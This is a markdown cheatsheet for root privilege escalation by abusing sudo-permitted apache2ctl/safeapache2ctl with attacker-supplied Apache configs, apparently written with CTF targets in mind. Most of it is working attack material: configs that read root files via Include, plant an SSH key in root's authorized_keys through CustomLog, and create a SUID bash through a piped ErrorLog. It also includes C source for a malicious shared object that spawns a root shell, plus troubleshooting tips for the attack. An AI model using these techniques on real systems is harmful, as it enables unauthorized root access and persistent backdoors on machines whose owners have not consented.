
# 🔥 Apachectl / safeapache2ctl Privilege Escalation Cheatsheet

Misconfigured `apache2ctl` / `safeapache2ctl` in `sudo` can be abused to **read**, **write**, and **execute** as root by supplying your own Apache config.

---

## 🎯 1. Enumeration

### Check sudo rights

```bash
sudo -l
```

Look for:

```
(ALL) NOPASSWD: /usr/local/bin/apache2ctl
(ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

### Test a custom config

```bash
mkdir -p ~/confs
vi ~/confs/test.conf
sudo /usr/local/bin/safeapache2ctl -f ~/confs/test.conf start
```

### Always include minimal stubs

Apache refuses to start without these basics:

```apache
ServerRoot "/etc/apache2"
PidFile "/tmp/httpd.pid"
ErrorLog "/tmp/error.log"
Listen 8080
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
```

---

## 📖 2. Exploitation Techniques

### 📝 A. File Read — `Include`

Leak root flag or sensitive files:

```apache
ServerRoot "/etc/apache2"
PidFile "/tmp/httpd.pid"
ErrorLog "/tmp/error.log"
Listen 8080
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

Include /root/root.txt
```

➡ Run:

```bash
sudo /usr/local/bin/safeapache2ctl -f ~/confs/readflag.conf configtest
```

Output shows file contents.

---

### ✍️ B. File Write — `CustomLog`

Drop your **SSH key** into root’s authorized\_keys:

```apache
ServerRoot "/etc/apache2"
PidFile "/tmp/httpd.pid"
ErrorLog "/tmp/error.log"
Listen 8080
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

CustomLog "/root/.ssh/authorized_keys" "ssh-ed25519 AAAAC3Nz... attacker@kali"
```

➡ Run:

```bash
sudo /usr/local/bin/safeapache2ctl -f ~/confs/rootkey.conf start
```

Then connect:

```bash
ssh -i /tmp/root_ed root@target
```

Safer **append variant** (avoids overwrite):

```apache
CustomLog "|/bin/sh -c 'cat >> /root/.ssh/authorized_keys'" "ssh-ed25519 AAAAC3Nz..."
```

---

### 💥 C. Command Execution — `ErrorLog` Piped

Turn `ErrorLog` into a root command runner:

```apache
ServerRoot "/tmp"
ServerName localhost
Listen 8089
PidFile "/tmp/httpd.pid"
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

ErrorLog "|/bin/sh -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'"
DocumentRoot "/tmp"
```

➡ Run and then:

```bash
/tmp/rootbash -p
```

Root shell with SUID bit set.

---

### 🧩 D. Shared Object Execution — `LoadFile`

Compile a malicious `.so` that spawns a root shell:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void run() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```

Build:

```bash
gcc -fPIC -shared -o ~/root.so root.c
```

Config:

```apache
ServerRoot "/etc/apache2"
PidFile "/tmp/httpd.pid"
ErrorLog "/tmp/error.log"
Listen 8080

LoadFile /home/mark/root.so
```

➡ Run → root shell.

---

## 🔍 3. Debugging & Tips

* Always override the `ErrorLog` path:

  ```apache
  ErrorLog "/tmp/apache_error.log"
  ```

  (Avoid `/etc/apache2/logs/` errors).

* Test writes safely first:

  ```apache
  CustomLog "/tmp/test.txt" "hello world"
  ```

  Then check:

  ```bash
  cat /tmp/test.txt
  ```

* Don’t worry if `safeapache2ctl` ends with **“Terminated”** — directives are parsed and executed *before* termination.

##
##


  
